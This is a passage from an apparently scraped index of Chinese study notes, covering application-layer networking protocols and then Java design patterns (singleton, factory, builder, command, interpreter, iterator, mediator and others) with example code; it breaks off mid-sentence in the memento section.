的连接释放采用四报文握手机制。任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送时，则发送连接释放通知，对方确认后就完全关闭了 TCP 连接  5.3. 补充（重要）    以下知识点需要重点关注：\n 端口和套接字的意义 UDP 和 TCP 的区别以及两者的应用场景 在不可靠的网络上实现可靠传输的工作原理，停止等待协议和 ARQ 协议 TCP 的滑动窗口，流量控制，拥塞控制和连接管理 TCP 的三次握手，四次挥手机制  6. 应用层（Application Layer）    6.1. 基本术语     域名系统（DNS） ：域名系统（DNS，Domain Name System）将人类可读的域名 (例如，www.baidu.com) 转换为机器可读的 IP 地址 (例如，220.181.38.148)。我们可以将其理解为专为互联网设计的电话薄。  https://www.seobility.net/en/wiki/HTTP_headers\n文件传输协议（FTP） ：FTP 是 File TransferProtocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于 Internet 上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的 FTP 应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在 FTP 的使用当中，用户经常遇到两个概念：\u0026ldquo;下载\u0026rdquo;（Download）和\u0026quot;上传\u0026quot;（Upload）。 \u0026ldquo;下载\u0026quot;文件就是从远程主机拷贝文件至自己的计算机上；\u0026ldquo;上传\u0026quot;文件就是将文件从自己的计算机中拷贝至远程主机上。用 Internet 语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。  简单文件传输协议（TFTP） ：TFTP（Trivial File Transfer Protocol,简单文件传输协议）是 TCP/IP 协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。端口号为 69。 远程终端协议（TELNET） ：Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用 telnet 程序，用它连接到服务器。终端使用者可以在 telnet 程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet 会话，必须输入用户名和密码来登录服务器。Telnet 是常用的远程控制 Web 服务器的方法。 万维网（WWW） ：WWW 是环球信息网的缩写，（亦作“Web”、“WWW”、“\u0026lsquo;W3\u0026rsquo;”，英文全称为“World Wide Web”），中文名字为“万维网”，\u0026ldquo;环球网\u0026quot;等，常简称为 Web。分为 Web 客户端和 Web 服务器程序。WWW 可以让 Web 客户端（常用浏览器）访问浏览 Web 服务器上的页面。是一个由许多互相链接的超文本组成的系统，通过互联网访问。在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URI）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。万维网联盟（英语：World Wide Web Consortium，简称 W3C），又称 W3C 理事会。1994 年 10 月在麻省理工学院（MIT）计算机科学实验室成立。万维网联盟的创建者是万维网的发明者蒂姆·伯纳斯-李。万维网并不等同互联网，万维网只是互联网所能提供的服务其中之一，是靠着互联网运行的一项服务。 万维网的大致工作工程：  统一资源定位符（URL） ：统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的 URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。 超文本传输协议（HTTP） ：超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的 WWW 文件都必须遵守这个标准。设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。1960 年美国人 Ted Nelson 构思了一种通过计算机处理文本信息的方法，并称之为超文本（hypertext）,这成为了 HTTP 超文本传输协议标准架构的发展根基。  HTTP 协议的本质就是一种浏览器与服务器之间约定好的通信格式。HTTP 的原理如下图所示：\n代理服务器（Proxy Server） ： 代理服务器（Proxy Server）是一种网络实体，它又称为万维网高速缓存。 代理服务器把最近的一些请求和响应暂存在本地磁盘中。当新请求到达时，若代理服务器发现这个请求与暂时存放的的请求相同，就返回暂存的响应，而不需要按 URL 的地址再次去互联网访问该资源。代理服务器可在客户端或服务器工作，也可以在中间系统工作。 简单邮件传输协议(SMTP) : SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。 SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。 通过 SMTP 协议所指定的服务器,就可以把 E-mail 寄到收信人的服务器上了，整个过程只要几分钟。SMTP 服务器则是遵循 SMTP 协议的发送邮件服务器，用来发送或中转发出的电子邮件。  https://www.campaignmonitor.com/resources/knowledge-base/what-is-the-code-that-makes-bcc-or-cc-operate-in-an-email/ 搜索引擎 :搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。  垂直搜索引擎 ：垂直搜索引擎是针对某一个行业的专业搜索引擎，是搜索引擎的细分和延伸，是对网页库中的某类专门的信息进行一次整合，定向分字段抽取出需要的数据进行处理后再以某种形式返回给用户。垂直搜索是相对通用搜索引擎的信息量大、查询不准确、深度不够等提出来的新的搜索引擎服务模式，通过针对某一特定领域、某一特定人群或某一特定需求提供的有一定价值的信息和相关服务。其特点就是“专、精、深”，且具有行业色彩，相比较通用搜索引擎的海量信息无序化，垂直搜索引擎则显得更加专注、具体和深入。 全文索引 :全文索引技术是目前搜索引擎的关键技术。试想在 1M 大小的文件中搜索一个词，可能需要几秒，在 100M 的文件中可能需要几十秒，如果在更大的文件中搜索那么就需要更大的系统开销，这样的开销是不现实的。所以在这样的矛盾下出现了全文索引技术，有时候有人叫倒排文档技术。 目录索引 ：目录索引（ search index/directory)，顾名思义就是将网站分门别类地存放在相应的目录中，因此用户在查询信息时，可选择关键词搜索，也可按分类目录逐层查找。  6.2. 重要知识点总结     文件传输协议（FTP）使用 TCP 可靠的运输服务。FTP 使用客户服务器方式。一个 FTP 服务器进程可以同时为多个用户提供服务。在进进行文件传输时，FTP 的客户和服务器之间要先建立两个并行的 TCP 连接:控制连接和数据连接。实际用于传输文件的是数据连接。 万维网客户程序与服务器之间进行交互使用的协议是超文本传输协议 HTTP。HTTP 使用 TCP 连接进行可靠传输。但 HTTP 本身是无连接、无状态的。HTTP/1.1 协议使用了持续连接（分为非流水线方式和流水线方式） 电子邮件把邮件发送到收件人使用的邮件服务器，并放在其中的收件人邮箱中，收件人可随时上网到自己使用的邮件服务器读取，相当于电子邮箱。 一个电子邮件系统有三个重要组成构件：用户代理、邮件服务器、邮件协议（包括邮件发送协议，如 SMTP，和邮件读取协议，如 POP3 和 IMAP）。用户代理和邮件服务器都要运行这些协议。  6.3. 补充（重要）    以下知识点需要重点关注：\n 应用层的常见协议（重点关注 HTTP 协议） 域名系统-从域名解析出 IP 地址 访问一个网站大致的过程 系统调用和应用编程接口概念  "},{"id":375,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","title":"设计模式","parent":"设计模式","content":" 一、概述 二、创建型  1. 单例（Singleton）  Intent Class Diagram Implementation Examples JDK   2. 简单工厂（Simple Factory）  Intent Class Diagram Implementation   3. 工厂方法（Factory Method）  Intent Class Diagram Implementation JDK   4. 抽象工厂（Abstract Factory）  Intent Class Diagram Implementation JDK   5. 生成器（Builder）  Intent Class Diagram Implementation JDK   6. 原型模式（Prototype）  Intent Class Diagram Implementation JDK     三、行为型  1. 责任链（Chain Of Responsibility）  Intent Class Diagram Implementation JDK   2. 命令（Command）  Intent Class Diagram Implementation JDK   3. 解释器（Interpreter）  Intent Class Diagram Implementation JDK   4. 迭代器（Iterator）  Intent Class Diagram Implementation JDK   5. 中介者（Mediator）  Intent Class Diagram Implementation JDK   6. 备忘录（Memento）  Intent Class Diagram Implementation JDK   7. 观察者（Observer）  Intent Class Diagram Implementation JDK   8. 状态（State）  Intent Class Diagram Implementation   9. 策略（Strategy）  Intent Class Diagram 与状态模式的比较 Implementation JDK   10. 模板方法（Template Method）  Intent Class Diagram Implementation JDK   11. 访问者（Visitor）  Intent Class Diagram Implementation JDK   12. 空对象（Null）  Intent Class Diagram Implementation     四、结构型  1. 适配器（Adapter）  Intent Class Diagram Implementation JDK   2. 桥接（Bridge）  Intent Class Diagram Implementation JDK   3. 组合（Composite）  Intent Class Diagram Implementation JDK   4. 装饰（Decorator）  Intent Class Diagram Implementation 设计原则 JDK   5. 外观（Facade）  Intent Class Diagram Implementation 设计原则   6. 享元（Flyweight）  Intent Class Diagram Implementation JDK   7. 代理（Proxy）  Intent Class Diagram Implementation JDK     参考资料  一、概述    设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。\n拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。\n二、创建型    1. 单例（Singleton）    Intent    确保一个类只有一个实例，并提供该实例的全局访问点。\nClass Diagram    使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。\n私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。\n\nImplementation    Ⅰ 懒汉式-线程不安全    以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。\n这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 if (uniqueInstance == null) ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 uniqueInstance = new Singleton(); 语句，这将导致实例化多次 uniqueInstance。\npublic class Singleton { private static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; } } Ⅱ 饿汉式-线程安全    线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。\n但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。\nprivate static Singleton uniqueInstance = new Singleton(); Ⅲ 懒汉式-线程安全    只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。\n但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。\npublic static synchronized Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; } Ⅳ 双重校验锁-线程安全    uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。\n双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。\npublic class Singleton { private volatile static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { synchronized (Singleton.class) { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } } } return uniqueInstance; } } 考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 uniqueInstance = new Singleton(); 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句：第一个 if 语句用来避免 uniqueInstance 已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 uniqueInstance == null 时两个线程同时进行实例化操作。\nif (uniqueInstance == null) { synchronized (Singleton.class) { uniqueInstance = new Singleton(); } } uniqueInstance 采用 volatile 关键字修饰也是很有必要的， uniqueInstance = new Singleton(); 这段代码其实是分为三步执行：\n 为 uniqueInstance 分配内存空间 初始化 uniqueInstance 将 uniqueInstance 指向分配的内存地址  但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1\u0026gt;3\u0026gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T1 执行了 1 和 3，此时 T2 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。\n使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。\nⅤ 静态内部类实现    当 Singleton 类被加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 getUniqueInstance() 方法从而触发 SingletonHolder.INSTANCE 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。\n这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。\npublic class Singleton { private Singleton() { } private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } public static Singleton getUniqueInstance() { return SingletonHolder.INSTANCE; } } Ⅵ 枚举实现    public enum Singleton { INSTANCE; private String objName; public String getObjName() { return objName; } public void setObjName(String objName) { this.objName = objName; } public static void main(String[] args) { // 单例测试  Singleton firstSingleton = Singleton.INSTANCE; firstSingleton.setObjName(\u0026#34;firstName\u0026#34;); System.out.println(firstSingleton.getObjName()); Singleton secondSingleton = Singleton.INSTANCE; secondSingleton.setObjName(\u0026#34;secondName\u0026#34;); System.out.println(firstSingleton.getObjName()); System.out.println(secondSingleton.getObjName()); // 反射获取实例测试  try { Singleton[] enumConstants = Singleton.class.getEnumConstants(); for (Singleton enumConstant : enumConstants) { System.out.println(enumConstant.getObjName()); } } catch (Exception e) { e.printStackTrace(); } } } firstName secondName secondName secondName 该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。\n该实现在多次序列化和序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。\nExamples     Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons  JDK     java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager()  2. 简单工厂（Simple Factory）    Intent    在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。\nClass Diagram    简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。\n这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。\n\nImplementation    public interface Product { } public class ConcreteProduct implements Product { } public class ConcreteProduct1 implements Product { } public class ConcreteProduct2 implements Product { } 以下的 Client 类包含了实例化的代码，这是一种错误的实现。如果在客户类中存在这种实例化代码，就需要考虑将代码放到简单工厂中。\npublic class Client { public static void main(String[] args) { int type = 1; Product product; if (type == 1) { product = new ConcreteProduct1(); } else if (type == 2) { product = new ConcreteProduct2(); } else { product = new ConcreteProduct(); } // do something with the product  } } 以下的 SimpleFactory 是简单工厂实现，它被所有需要进行实例化的客户类调用。\npublic class SimpleFactory { public Product createProduct(int type) { if (type == 1) { return new ConcreteProduct1(); } else if (type == 2) { return new ConcreteProduct2(); } return new ConcreteProduct(); } } public class Client { public static void main(String[] args) { SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); // do something with the product  } } 3. 工厂方法（Factory Method）    Intent    定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。\nClass Diagram    在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。\n下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。\n\nImplementation    public abstract class Factory { abstract public Product factoryMethod(); public void doSomething() { Product product = factoryMethod(); // do something with the product  } } public class ConcreteFactory extends Factory { public Product factoryMethod() { return new ConcreteProduct(); } } public class ConcreteFactory1 extends Factory { public Product factoryMethod() { return new ConcreteProduct1(); } } public class ConcreteFactory2 extends Factory { public Product factoryMethod() { return new ConcreteProduct2(); } } JDK     java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext  4. 抽象工厂（Abstract Factory）    Intent    提供一个接口，用于创建 相关的对象家族 。\nClass Diagram    抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。\n抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。\n至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。\n从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。\n\nImplementation    public class AbstractProductA { } public class AbstractProductB { } public class ProductA1 extends AbstractProductA { } public class ProductA2 extends AbstractProductA { } public class ProductB1 extends AbstractProductB { } public class ProductB2 extends AbstractProductB { } public abstract class AbstractFactory { abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB(); } public class ConcreteFactory1 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA1(); } AbstractProductB createProductB() { return new ProductB1(); } } public class ConcreteFactory2 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA2(); } AbstractProductB createProductB() { return new ProductB2(); } } public class Client { public static void main(String[] args) { AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB  } } JDK     javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory  5. 生成器（Builder）    Intent    封装一个对象的构造过程，并允许按步骤构造。\nClass Diagram    \nImplementation    以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。\npublic class AbstractStringBuilder { protected char[] value; protected int count; public AbstractStringBuilder(int capacity) { count = 0; value = new char[capacity]; } public AbstractStringBuilder append(char c) { ensureCapacityInternal(count + 1); value[count++] = c; return this; } private void ensureCapacityInternal(int minimumCapacity) { // overflow-conscious code  if (minimumCapacity - value.length \u0026gt; 0) expandCapacity(minimumCapacity); } void expandCapacity(int minimumCapacity) { int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity \u0026lt; 0) newCapacity = minimumCapacity; if (newCapacity \u0026lt; 0) { if (minimumCapacity \u0026lt; 0) // overflow  throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; } value = Arrays.copyOf(value, newCapacity); } } public class StringBuilder extends AbstractStringBuilder { public StringBuilder() { super(16); } @Override public String toString() { // Create a copy, don\u0026#39;t share the array  return new String(value, 0, count); } } public class Client { public static void main(String[] args) { StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i \u0026lt; count; i++) { sb.append((char) (\u0026#39;a\u0026#39; + i)); } System.out.println(sb.toString()); } } abcdefghijklmnopqrstuvwxyz JDK     java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders  6. 原型模式（Prototype）    Intent    使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。\nClass Diagram    \nImplementation    public abstract class Prototype { abstract Prototype myClone(); } public class ConcretePrototype extends Prototype { private String filed; public ConcretePrototype(String filed) { this.filed = filed; } @Override Prototype myClone() { return new ConcretePrototype(filed); } @Override public String toString() { return filed; } } public class Client { public static void main(String[] args) { Prototype prototype = new ConcretePrototype(\u0026#34;abc\u0026#34;); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); } } abc JDK     java.lang.Object#clone()  三、行为型    1. 责任链（Chain Of Responsibility）    Intent    使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。\nClass Diagram     Handler：定义处理请求的接口，并且实现后继链（successor）  \nImplementation    public abstract class Handler { protected Handler successor; public Handler(Handler successor) { this.successor = successor; } protected abstract void handleRequest(Request request); } public class ConcreteHandler1 extends Handler { public ConcreteHandler1(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE1) { System.out.println(request.getName() + \u0026#34; is handle by ConcreteHandler1\u0026#34;); return; } if (successor != null) { successor.handleRequest(request); } } } public class ConcreteHandler2 extends Handler { public ConcreteHandler2(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE2) { System.out.println(request.getName() + \u0026#34; is handle by ConcreteHandler2\u0026#34;); return; } if (successor != null) { successor.handleRequest(request); } } } public class Request { private RequestType type; private String name; public Request(RequestType type, String name) { this.type = type; this.name = name; } public RequestType getType() { return type; } public String getName() { return name; } } public enum RequestType { TYPE1, TYPE2 } public class Client { public static void main(String[] args) { Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.TYPE1, \u0026#34;request1\u0026#34;); handler2.handleRequest(request1); Request request2 = new Request(RequestType.TYPE2, \u0026#34;request2\u0026#34;); handler2.handleRequest(request2); } } request1 is handle by ConcreteHandler1 request2 is handle by ConcreteHandler2 JDK     java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter()  2. 命令（Command）    Intent    将命令封装成对象中，具有以下作用：\n 使用命令来参数化其它对象 将命令放入队列中进行排队 将命令的操作记录到日志中 支持可撤销的操作  Class Diagram     Command：命令 Receiver：命令接收者，也就是命令真正的执行者 Invoker：通过它来调用命令 Client：可以设置命令与命令的接收者  \nImplementation    设计一个遥控器，可以控制电灯开关。\n\npublic interface Command { void execute(); } public class LightOnCommand implements Command { Light light; public LightOnCommand(Light light) { this.light = light; } @Override public void execute() { light.on(); } } public class LightOffCommand implements Command { Light light; public LightOffCommand(Light light) { this.light = light; } @Override public void execute() { light.off(); } } public class Light { public void on() { System.out.println(\u0026#34;Light is on!\u0026#34;); } public void off() { System.out.println(\u0026#34;Light is off!\u0026#34;); } } /** * 遥控器 */ public class Invoker { private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() { this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; } public void setOnCommand(Command command, int slot) { onCommands[slot] = command; } public void setOffCommand(Command command, int slot) { offCommands[slot] = command; } public void onButtonWasPushed(int slot) { onCommands[slot].execute(); } public void offButtonWasPushed(int slot) { offCommands[slot].execute(); } } public class Client { public static void main(String[] args) { Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); } } JDK     java.lang.Runnable Netflix Hystrix javax.swing.Action  3. 解释器（Interpreter）    Intent    为语言创建解释器，通常由语言的语法和语法分析来定义。\nClass Diagram     TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression。 Context：上下文，包含解释器之外的一些全局信息。  \nImplementation    以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。\n例如一颗解析树为 D And (A Or (B C))，文本 \u0026ldquo;D A\u0026rdquo; 满足该解析树定义的规则。\n这里的 Context 指的是 String。\npublic abstract class Expression { public abstract boolean interpret(String str); } public class TerminalExpression extends Expression { private String literal = null; public TerminalExpression(String str) { literal = str; } public boolean interpret(String str) { StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) { String test = st.nextToken(); if (test.equals(literal)) { return true; } } return false; } } public class AndExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) \u0026amp;\u0026amp; expression2.interpret(str); } } public class OrExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) || expression2.interpret(str); } } public class Client { /** * 构建解析树 */ public static Expression buildInterpreterTree() { // Literal  Expression terminal1 = new TerminalExpression(\u0026#34;A\u0026#34;); Expression terminal2 = new TerminalExpression(\u0026#34;B\u0026#34;); Expression terminal3 = new TerminalExpression(\u0026#34;C\u0026#34;); Expression terminal4 = new TerminalExpression(\u0026#34;D\u0026#34;); // B C  Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C)  Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C))  return new AndExpression(terminal4, alternation2); } public static void main(String[] args) { Expression define = buildInterpreterTree(); String context1 = \u0026#34;D A\u0026#34;; String context2 = \u0026#34;A B\u0026#34;; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); } } true false JDK     java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver  4. 迭代器（Iterator）    Intent    提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。\nClass Diagram     Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator； Iterator 主要定义了 hasNext() 和 next() 方法。 Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。  \nImplementation    public interface Aggregate { Iterator createIterator(); } public class ConcreteAggregate implements Aggregate { private Integer[] items; public ConcreteAggregate() { items = new Integer[10]; for (int i = 0; i \u0026lt; items.length; i++) { items[i] = i; } } @Override public Iterator createIterator() { return new ConcreteIterator\u0026lt;Integer\u0026gt;(items); } } public interface Iterator\u0026lt;Item\u0026gt; { Item next(); boolean hasNext(); } public class ConcreteIterator\u0026lt;Item\u0026gt; implements Iterator { private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) { this.items = items; } @Override public Object next() { return items[position++]; } @Override public boolean hasNext() { return position \u0026lt; items.length; } } public class Client { public static void main(String[] args) { Aggregate aggregate = new ConcreteAggregate(); Iterator\u0026lt;Integer\u0026gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) { System.out.println(iterator.next()); } } } JDK     java.util.Iterator java.util.Enumeration  5. 中介者（Mediator）    Intent    集中相关对象之间复杂的沟通和控制方式。\nClass Diagram     Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。 Colleague：同事，相关对象  \nImplementation    Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构：\n\n使用中介者模式可以将复杂的依赖结构变成星形结构：\n\npublic abstract class Colleague { public abstract void onEvent(Mediator mediator); } public class Alarm extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;alarm\u0026#34;); } public void doAlarm() { System.out.println(\u0026#34;doAlarm()\u0026#34;); } } public class CoffeePot extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;coffeePot\u0026#34;); } public void doCoffeePot() { System.out.println(\u0026#34;doCoffeePot()\u0026#34;); } } public class Calender extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;calender\u0026#34;); } public void doCalender() { System.out.println(\u0026#34;doCalender()\u0026#34;); } } public class Sprinkler extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;sprinkler\u0026#34;); } public void doSprinkler() { System.out.println(\u0026#34;doSprinkler()\u0026#34;); } } public abstract class Mediator { public abstract void doEvent(String eventType); } public class ConcreteMediator extends Mediator { private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) { this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; } @Override public void doEvent(String eventType) { switch (eventType) { case \u0026#34;alarm\u0026#34;: doAlarmEvent(); break; case \u0026#34;coffeePot\u0026#34;: doCoffeePotEvent(); break; case \u0026#34;calender\u0026#34;: doCalenderEvent(); break; default: doSprinklerEvent(); } } public void doAlarmEvent() { alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); } public void doCoffeePotEvent() { // ...  } public void doCalenderEvent() { // ...  } public void doSprinklerEvent() { // ...  } } public class Client { public static void main(String[] args) { Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // 闹钟事件到达，调用中介者就可以操作相关对象  alarm.onEvent(mediator); } } doAlarm() doCoffeePot() doCalender() doSprinkler() JDK     All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke()  6. 备忘录（Memento）    Intent    在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。\nClass Diagram     Originator：原始对象 Caretaker：负责保存好备忘录 Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 